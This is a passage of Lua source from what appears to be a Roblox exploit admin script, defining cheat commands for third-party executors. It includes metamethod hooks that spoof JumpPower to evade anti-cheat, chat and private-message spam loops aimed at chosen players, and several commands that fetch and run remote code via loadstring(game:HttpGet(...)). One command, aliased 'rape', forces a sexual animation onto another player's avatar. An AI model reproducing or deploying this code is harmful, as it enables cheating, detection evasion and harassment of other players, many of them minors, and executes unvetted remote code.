			WalkSpeedChange()
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				WalkSpeedChange()
				HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			end)
		end
	end)

	addcmd('unloopspeed',{'unloopws'},function(args, speaker)
		HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or nil
		HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or nil
	end)

	addcmd('spoofjumppower',{'spoofjp'},function(args, speaker)
		if args[1] and isNumber(args[1]) then
			if hookmetamethod then
				local char = speaker.Character
				local setpower;
				local index; index = hookmetamethod(game, "__index", function(self, key)
					local keyclean = key:gsub("\0", "")
					if (keyclean == "JumpPower" or keyclean == "jumpPower") and self:IsA("Humanoid") and self:IsDescendantOf(char) and not checkcaller() then
						return setpower or args[1]
					end
					return index(self, key)
				end)
				local newindex; newindex = hookmetamethod(game, "__newindex", function(self, key, value)
					local keyclean = string.gsub(key, "\0", "")
					if (keyclean == "JumpPower" or keyclean == "jumpPower") and self:IsA("Humanoid") and self:IsDescendantOf(char) and not checkcaller() then
						setpower = tonumber(value)
						return setpower
					end
					return newindex(self, key, value)
				end)
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
			end
		end
	end)

	addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function JumpPowerChange()
				if Char and Human then
					if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
						speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
					else
						speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = jpower
					end
				end
			end
			JumpPowerChange()
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				JumpPowerChange()
				HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			end)
		end
	end)

	addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or nil
		HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or nil
		if Char and Human then
			if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
				speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = 50
			else
				speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = 50
			end
		end
	end)

	addcmd('tools',{'gears'},function(args, speaker)
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(Lighting)
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(ReplicatedStorage)
		notify('Tools','Copied tools from ReplicatedStorage and Lighting')
	end)

	addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('deleteselectedtool',{'dst'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('console',{},function(args, speaker)
		-- Thanks wally!!
		notify("Loading",'Hold on a sec')
		local _, str = pcall(function()
			return game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/console.lua", true)
		end)

		local s, e = loadstring(str)
		if typeof(s) ~= "function" then
			return
		end

		local success, message = pcall(s)
		if (not success) then
			if printconsole then
				printconsole(message)
			elseif printoutput then
				printoutput(message)
			end
		end
		wait(1)
		notify('Console','Press F9 to open the console')
	end)

	addcmd('explorer', {'dex'}, function(args, speaker)
		notify('Loading', 'Hold on a sec')
		loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
	end)

	addcmd('olddex', {'odex'}, function(args, speaker)
		notify('Loading old explorer', 'Hold on a sec')

		local getobjects = function(a)
			local Objects = {}
			if a then
				local b = InsertService:LoadLocalAsset(a)
				if b then 
					table.insert(Objects, b) 
				end
			end
			return Objects
		end

		local Dex = getobjects("rbxassetid://10055842438")[1]
		Dex.Parent = PARENT

		local function Load(Obj, Url)
			local function GiveOwnGlobals(Func, Script)
				-- Fix for this edit of dex being poorly made
				-- I (Alex) would like to commemorate whoever added this dex in somehow finding the worst dex to ever exist
				local Fenv, RealFenv, FenvMt = {}, {
					script = Script,
					getupvalue = function(a, b)
						return nil -- force it to use globals
					end,
					getreg = function() -- It loops registry for some idiotic reason so stop it from doing that and just use a global
						return {} -- force it to use globals
					end,
					getprops = getprops or function(inst)
						if getproperties then
							local props = getproperties(inst)
							if props[1] and gethiddenproperty then
								local results = {}
								for _,name in pairs(props) do
									local success, res = pcall(gethiddenproperty, inst, name)
									if success then
										results[name] = res
									end
								end

								return results
							end

							return props
						end

						return {}
					end
				}, {}
				FenvMt.__index = function(a,b)
					return RealFenv[b] == nil and getgenv()[b] or RealFenv[b]
				end
				FenvMt.__newindex = function(a, b, c)
					if RealFenv[b] == nil then 
						getgenv()[b] = c 
					else 
						RealFenv[b] = c 
					end
				end
				setmetatable(Fenv, FenvMt)
				pcall(setfenv, Func, Fenv)
				return Func
			end

			local function LoadScripts(_, Script)
				if Script:IsA("LocalScript") then
					task.spawn(function()
						GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
					end)
				end
				table.foreach(Script:GetChildren(), LoadScripts)
			end

			LoadScripts(nil, Obj)
		end

		Load(Dex)
	end)

	addcmd('remotespy',{'rspy'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		-- Full credit to exx, creator of SimpleSpy
		-- also thanks to NoobSploit for fixing
		loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
	end)

	addcmd('audiologger',{'alogger'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
	end)

	local loopgoto = nil
	addcmd('loopgoto',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			loopgoto = nil
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			loopgoto = Players[v]
			local distance = 3
			if args[2] and isNumber(args[2]) then
				distance = args[2]
			end
			local lDelay = 0
			if args[3] and isNumber(args[3]) then
				lDelay = args[3]
			end
			repeat
				if Players:FindFirstChild(v) then
					if Players[v].Character ~= nil then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(distance,1,0)
					end
					wait(lDelay)
				else
					loopgoto = nil
				end
			until loopgoto ~= Players[v]
		end
	end)

	addcmd('unloopgoto',{'noloopgoto'},function(args, speaker)
		loopgoto = nil
	end)

	addcmd('headsit',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if headSit then headSit:Disconnect() end
		for i,v in pairs(players)do
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true
			headSit = RunService.Heartbeat:Connect(function()
				if Players:FindFirstChild(Players[v].Name) and Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
					getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
				else
					headSit:Disconnect()
				end
			end)
		end
	end)

	addcmd('chat',{'say'},function(args, speaker)
		local cString = getstring(1)
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cString, "All")
	end)


	spamming = false
	spamspeed = 1
	addcmd('spam',{},function(args, speaker)
		spamming = true
		local spamstring = getstring(1)
		repeat wait(spamspeed)
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamstring, "All")
		until spamming == false
	end)

	addcmd('nospam',{'unspam'},function(args, speaker)
		spamming = false
	end)

	addcmd('whisper',{'pm'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				local plrName = Players[v].Name
				local pmstring = getstring(2)
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmstring, "All")
			end)
		end
	end)

	pmspamming = {}
	addcmd('pmspam',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				local plrName = Players[v].Name
				if FindInTable(pmspamming, plrName) then return end
				table.insert(pmspamming, plrName)
				local pmspamstring = getstring(2)
				repeat
					if Players:FindFirstChild(v) then
						wait(spamspeed)
						ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmspamstring, "All")
					else
						for a,b in pairs(pmspamming) do if b == plrName then table.remove(pmspamming, a) end end
					end
				until not FindInTable(pmspamming, plrName)
			end)
		end
	end)

	addcmd('nopmspam',{'unpmspam'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				for a,b in pairs(pmspamming) do
					if b == Players[v].Name then
						table.remove(pmspamming, a)
					end
				end
			end)
		end
	end)

	addcmd('spamspeed',{},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			spamspeed = speed
		end
	end)

	addcmd('bubblechat',{},function(args, speaker)
		ChatService.BubbleChatEnabled = true
	end)

	addcmd('unbubblechat',{'nobubblechat'},function(args, speaker)
		ChatService.BubbleChatEnabled = false
	end)

	addcmd('safechat',{},function(args, speaker)
		speaker:SetSuperSafeChat(true)
	end)

	addcmd('nosafechat',{'disablesafechat','unsafechat'},function(args, speaker)
		speaker:SetSuperSafeChat(false)
	end)

	addcmd('blockhead',{},function(args, speaker)
		speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
	end)

	addcmd('blockhats',{},function(args, speaker)
		for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
			for i,c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('blocktool',{},function(args, speaker)
		for _,v in pairs(speaker.Character:GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				for i,c in pairs(v:GetDescendants()) do
					if c:IsA("SpecialMesh") then
						c:Destroy()
					end
				end
			end
		end
	end)

	addcmd('creeper',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character.LeftUpperArm:Destroy()
			speaker.Character.RightUpperArm:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		else
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character["Left Arm"]:Destroy()
			speaker.Character["Right Arm"]:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		end
	end)

	function getTorso(x)
		x = x or Players.LocalPlayer.Character
		return x:FindFirstChild("Torso") or x:FindFirstChild("UpperTorso") or x:FindFirstChild("LowerTorso") or x:FindFirstChild("HumanoidRootPart")
	end

	addcmd("bang", {"rape"}, function(args, speaker)
		execCmd("unbang")
		wait()
		local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
		bangAnim = Instance.new("Animation")
		bangAnim.AnimationId = not r15(speaker) and "rbxassetid://148840371" or "rbxassetid://5918726674"
		bang = humanoid:LoadAnimation(bangAnim)
		bang:Play(0.1, 1, 1)
		bang:AdjustSpeed(args[2] or 3)
		bangDied = humanoid.Died:Connect(function()
			bang:Stop()
			bangAnim:Destroy()
			bangDied:Disconnect()
			bangLoop:Disconnect()
		end)
		if args[1] then
			local players = getPlayer(args[1], speaker)
			for _, v in pairs(players) do
				local bangplr = Players[v].Name
				local bangOffet = CFrame.new(0, 0, 1.1)
				bangLoop = RunService.Stepped:Connect(function()
					pcall(function()
						local otherRoot = getTorso(Players[bangplr].Character)
						getRoot(speaker.Character).CFrame = otherRoot.CFrame * bangOffet
					end)
				end)
			end
		end
	end)

	addcmd("unbang", {"unrape"}, function(args, speaker)
		if bangDied then
			bangDied:Disconnect()
			bang:Stop()
			bangAnim:Destroy()
			bangLoop:Disconnect()
		end
	end)

	addcmd('carpet',{},function(args, speaker)
		if not r15(speaker) then
			execCmd('uncarpet')
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				carpetAnim = Instance.new("Animation")
				carpetAnim.AnimationId = "rbxassetid://282574440"
				carpet = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
				carpet:Play(.1, 1, 1)
				local carpetplr = Players[v].Name
				carpetDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					carpetLoop:Disconnect()
					carpet:Stop()
					carpetAnim:Destroy()
					carpetDied:Disconnect()
				end)
				carpetLoop = RunService.Heartbeat:Connect(function()
					pcall(function()
						getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[carpetplr].Character).CFrame
					end)
				end)
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('uncarpet',{'nocarpet'},function(args, speaker)
		if carpetLoop then
			carpetLoop:Disconnect()
			carpetDied:Disconnect()
			carpet:Stop()
			carpetAnim:Destroy()
		end
	end)

	addcmd('friend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RequestFriendship(v)
		end
	end)

	addcmd('unfriend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RevokeFriendship(v)
		end
	end)

	addcmd('bringpart',{},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	addcmd('bringpartclass',{'bpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	gotopartDelay = 0.1
	addcmd('gotopart',{'topart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotopartclass',{'gpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopartclass',{'tgpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotomodel',{'tomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v:GetModelCFrame()
			end
		end
	end)

	addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v:GetModelCFrame()}):Play()
			end
		end
	end)

	addcmd('gotopartdelay',{},function(args, speaker)
		local gtpDelay = args[1] or 0.1
		if isNumber(gtpDelay) then
			gotopartDelay = gtpDelay
		end
	end)

	addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
		for i,v in ipairs(workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
			end
		end
	end)

	addcmd('fireclickdetectors',{'firecd','firecds'}, function(args, speaker)
		if fireclickdetector then
			if args[1] then
				local name = getstring(1)
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("ClickDetector") and descendant.Name == name then
						fireclickdetector(descendant)
					end
				end
			else
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("ClickDetector") then
						fireclickdetector(descendant)
					end
				end
			end
		else
			notify("Incompatible Exploit", "Your exploit does not support this command (missing fireclickdetector)")
		end
	end)

	addcmd('noproximitypromptlimits',{'nopplimits','removepplimits'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ProximityPrompt") then
				v.MaxActivationDistance = math.huge
			end
		end
	end)

	addcmd('fireproximityprompts',{'firepp'},function(args, speaker)
		if fireclickdetector then
			if args[1] then
				local name = getstring(1)
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("ProximityPrompt") and descendant.Name == name then
						fireproximityprompt(descendant)
					end
				end
			else
				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("ProximityPrompt") then
						fireproximityprompt(descendant)
					end
				end
			end
		else
			notify("Incompatible Exploit", "Your exploit does not support this command (missing fireproximityprompt)")
		end
	end)

	local PromptButtonHoldBegan = nil
	addcmd('instantproximityprompts',{'instantpp'},function(args, speaker)
		if fireproximityprompt then
			execCmd("uninstantproximityprompts")
			wait(0.1)
			PromptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
				fireproximityprompt(prompt)
			end)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing fireproximityprompt)')
		end
	end)

	addcmd('uninstantproximityprompts',{'uninstantpp'},function(args, speaker)
		if PromptButtonHoldBegan ~= nil then
			PromptButtonHoldBegan:Disconnect()
			PromptButtonHoldBegan = nil
		end
	end)

	addcmd('notifyping',{'ping'},function(args, speaker)
		notify("Ping", math.round(speaker:GetNetworkPing() * 1000) .. "ms")
	end)

	addcmd('grabtools', {}, function(args, speaker)
		local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
		for _, child in ipairs(workspace:GetChildren()) do
			if speaker.Character and child:IsA("BackpackItem") and child:FindFirstChild("Handle") then
				humanoid:EquipTool(child)
			end
		end

		if grabtoolsFunc then 
			grabtoolsFunc:Disconnect() 
		end

		grabtoolsFunc = workspace.ChildAdded:Connect(function(child)
			if speaker.Character and child:IsA("BackpackItem") and child:FindFirstChild("Handle") then
				humanoid:EquipTool(child)
			end
		end)

		notify("Grabtools", "Picking up any dropped tools")
	end)

	addcmd('nograbtools',{'ungrabtools'},function(args, speaker)
		if grabtoolsFunc then 
			grabtoolsFunc:Disconnect() 
		end

		notify("Grabtools", "Grabtools has been disabled")
	end)

	local specifictoolremoval = {}
	addcmd('removespecifictool',{},function(args, speaker)
		if args[1] and speaker:FindFirstChildOfClass("Backpack") then
			local tool = string.lower(getstring(1))
			local RST = RunService.RenderStepped:Connect(function()
				if speaker:FindFirstChildOfClass("Backpack") then
					for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
						if v.Name:lower() == tool then
							v:Remove()
						end
					end
				end
			end)
			specifictoolremoval[tool] = RST
		end
	end)

	addcmd('unremovespecifictool',{},function(args, speaker)
		if args[1] then
			local tool = string.lower(getstring(1))
			if specifictoolremoval[tool] ~= nil then
				specifictoolremoval[tool]:Disconnect()
				specifictoolremoval[tool] = nil
			end
		end
	end)

	addcmd('clearremovespecifictool',{},function(args, speaker)
		for obj in pairs(specifictoolremoval) do
			specifictoolremoval[obj]:Disconnect()
			specifictoolremoval[obj] = nil
		end
	end)

	addcmd('light',{},function(args, speaker)
		local light = Instance.new("PointLight")
		light.Parent = getRoot(speaker.Character)
		light.Range = 30
		if args[1] then
			light.Brightness = args[2]
			light.Range = args[1]
		else
			light.Brightness = 5
		end
	end)

	addcmd('unlight',{'nolight'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName == "PointLight" then
				v:Destroy()
			end
		end
	end)

	addcmd('copytools',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				for i,v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
					if v:IsA('Tool') or v:IsA('HopperBin') then
						v:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
					end
				end
			end)
		end
	end)

	addcmd('naked',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
				v:Destroy()
			end
		end
	end)

	addcmd('noface',{'removeface'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Decal") and v.Name == 'face' then
				v:Destroy()
			end
		end
	end)

	addcmd('spawnpoint',{'spawn'},function(args, speaker)
		spawnpos = getRoot(speaker.Character).CFrame
		spawnpoint = true
		spDelay = tonumber(args[1]) or 0.1
		notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
	end)

	addcmd('nospawnpoint',{'nospawn','removespawnpoint'},function(args, speaker)
		spawnpoint = false
		notify('Spawn Point','Removed spawn point')
	end)

	addcmd('flashback',{'diedtp'},function(args, speaker)
		if lastDeath ~= nil then
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(speaker.Character).CFrame = lastDeath
		end
	end)

	addcmd('hatspin',{'spinhats'},function(args, speaker)
		execCmd('unhatspin')
		wait(.5)
		for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
			local keep = Instance.new("BodyPosition") keep.Name = randomString() keep.Parent = v.Handle
			local spin = Instance.new("BodyAngularVelocity") spin.Name = randomString() spin.Parent = v.Handle
			v.Handle:FindFirstChildOfClass("Weld"):Destroy()
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinhats = RunService.Stepped:Connect(function()
				pcall(function()
					keep.Position = Players.LocalPlayer.Character.Head.Position
				end)
			end)
		end
	end)

	addcmd('unhatspin',{'unspinhats'},function(args, speaker)
		if spinhats then
			spinhats:Disconnect()
		end
		for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
			v.Parent = workspace
			for i,c in pairs(v.Handle) do
				if c:IsA("BodyPosition") or c:IsA("BodyAngularVelocity") then
					c:Destroy()
				end
			end
			wait()
			v.Parent = speaker.Character
		end
	end)

	addcmd('clearhats',{'cleanhats'},function(args, speaker)
		if firetouchinterest then
			local Player = Players.LocalPlayer
			local Character = Player.Character
			local Old = Character:FindFirstChild("HumanoidRootPart").CFrame
			local Hats = {}

			for _, child in ipairs(workspace:GetChildren()) do
				if child:IsA("Accessory") then
					table.insert(Hats, child)
				end
			end

			for _, accessory in ipairs(Character:FindFirstChildOfClass("Humanoid"):GetAccessories()) do
				accessory:Destroy()
			end

			for i = 1, #Hats do
				repeat RunService.Heartbeat:wait() until Hats[i]
				firetouchinterest(Hats[i].Handle,Character:FindFirstChild("HumanoidRootPart"),0)
				repeat RunService.Heartbeat:wait() until Character:FindFirstChildOfClass("Accessory")
				Character:FindFirstChildOfClass("Accessory"):Destroy()
				repeat RunService.Heartbeat:wait() until not Character:FindFirstChildOfClass("Accessory")
			end

			execCmd("reset")

			Player.CharacterAdded:Wait()

			for i = 1,20 do 
				RunService.Heartbeat:Wait()
				if Player.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character:FindFirstChild("HumanoidRootPart").CFrame = Old
				end
			end
		else
			notify("Incompatible Exploit","Your exploit does not support this command (missing firetouchinterest)")
		end
	end)

	addcmd('vr',{},function(args, speaker)
		-- Full credit to Abacaxl @V3rmillion
		notify("Loading", "Hold on a sec")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/vr.lua"))()
	end)

	addcmd('split',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.UpperTorso.Waist:Destroy()
		else
			notify('R15 Required','This command requires the r15 rig type')
		end
	end)

	addcmd('nilchar',{},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = nil
		end
	end)

	addcmd('unnilchar',{'nonilchar'},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = workspace
		end
	end)

	addcmd('noroot',{'removeroot','rroot'},function(args, speaker)
		if speaker.Character ~= nil then
			local char = Players.LocalPlayer.Character
			char.Parent = nil
			char.HumanoidRootPart:Destroy()
			char.Parent = workspace
		end
	end)

	addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
		if speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
			local Char = speaker.Character
			local OldParent = Char.Parent
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			local OldPos = HRP.CFrame
			Char.Parent = game
			local HRP1 = HRP:Clone()
			HRP1.Parent = Char
			HRP = HRP:Destroy()
			HRP1.CFrame = OldPos
			Char.Parent = OldParent
		end
	end)

	addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
		speaker:ClearCharacterAppearance()
	end)

	addcmd('equiptools',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				v.Parent = speaker.Character
			end
		end
	end)

	addcmd('unequiptools',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
	end)

	local function GetHandleTools(p)
		p = p or Players.LocalPlayer
		local r = {}
		for _, v in ipairs(p.Character and p.Character:GetChildren() or {}) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		for _, v in ipairs(p.Backpack:GetChildren()) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		return r
	end
	addcmd('dupetools', {'clonetools'}, function(args, speaker)
		local LOOP_NUM = tonumber(args[1]) or 1
